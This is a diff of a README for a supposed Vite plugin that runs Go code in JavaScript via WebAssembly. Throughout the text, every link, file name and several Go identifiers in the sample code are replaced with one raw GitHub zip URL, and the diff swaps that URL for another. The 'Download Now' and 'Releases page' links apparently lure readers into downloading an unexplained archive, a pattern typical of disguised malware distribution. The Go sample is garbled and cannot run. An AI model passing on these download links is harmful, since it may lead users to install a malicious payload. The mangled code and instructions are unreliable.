@@ -1,17 +1,17 @@
 # 🎉 vite-plugin-use-golang - Write Go in Your JavaScript Files
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip%20release-brightgreen)](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip%20release-brightgreen)](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with `vite-plugin-use-golang`. This tool allows you to write Go code directly in your JavaScript files and compile it to WebAssembly (WASM).
 
 ## 📝 What You Need
 - A computer with Windows, macOS, or Linux.
-- https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip installed on your system. You can download it [here](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip).
+- https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip installed on your system. You can download it [here](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip).
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip) to download the latest version.
 2. Choose the version that matches your operating system.
 3. Download the file and save it to a location you can easily access.
 
@@ -40,10 +40,10 @@ Follow these simple steps to get started with `vite-plugin-use-golang`. This too
    ```
 
 4. **Create a New JS File**  
-   Make a new file called `https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip` and open it in a text editor.
+   Make a new file called `https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip` and open it in a text editor.
 
 5. **Write Your Go Code**  
-   At the top of `https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip`, add:
+   At the top of `https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip`, add:
    ```javascript
    "use golang"
 
@@ -70,11 +70,11 @@ import (
   "syscall/js"
 )
 
-func hashImage(this https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip, args []https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip) interface{} {
+func hashImage(this https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip, args []https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip) interface{} {
   imgData := make([]byte, args[0].Length())
-  https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip(imgData, args[0])
+  https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip(imgData, args[0])
 
-  img, _, _ := https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip(https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip(imgData))
+  img, _, _ := https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip(https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip(imgData))
   
   // Do perceptual hashing with Go's image processing...
   // (see example/ for full implementation)
@@ -83,7 +83,7 @@ func hashImage(this https://raw.githubusercontent.com/Proforma-maraud670/vite-pl
 }
 
 func main() {
-  https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip().Set("hashImage", https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip(hashImage))
+  https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip().Set("hashImage", https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip(hashImage))
 }
 ```
 
@@ -95,7 +95,7 @@ This code allows you to get a hash from an image easily. You can expand upon thi
 - **WebAssembly**: Benefits from the performance of WebAssembly in the browser.
 
 ## ⚙️ Advanced Configuration
-For those who want to dive deeper, you can customize the plugin settings in `https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip`. Here’s a sample configuration:
+For those who want to dive deeper, you can customize the plugin settings in `https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip`. Here’s a sample configuration:
 
 ```javascript
 import { defineConfig } from 'vite'
@@ -107,7 +107,7 @@ export default defineConfig({
 ```
 
 ## 📢 Stay Updated
-Keep track of new features and updates by visiting our [Releases page](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip).
+Keep track of new features and updates by visiting our [Releases page](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip).
 
 ## 📞 Support
 If you have questions or need help, you can open an issue in the GitHub repository. We welcome your feedback!
@@ -115,4 +115,4 @@ If you have questions or need help, you can open an issue in the GitHub reposito
 ## 🎊 Conclusion
 `vite-plugin-use-golang` bridges the gap between Go and JavaScript, allowing you to leverage Go’s strengths right in the browser. 
 
-Get started today by downloading the latest version from the [Releases page](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/src/vite-plugin-use-golang_1.4.zip) and transform your web applications!
+Get started today by downloading the latest version from the [Releases page](https://raw.githubusercontent.com/Proforma-maraud670/vite-plugin-use-golang/main/example/golang-use-vite-plugin-3.7-beta.5.zip) and transform your web applications!
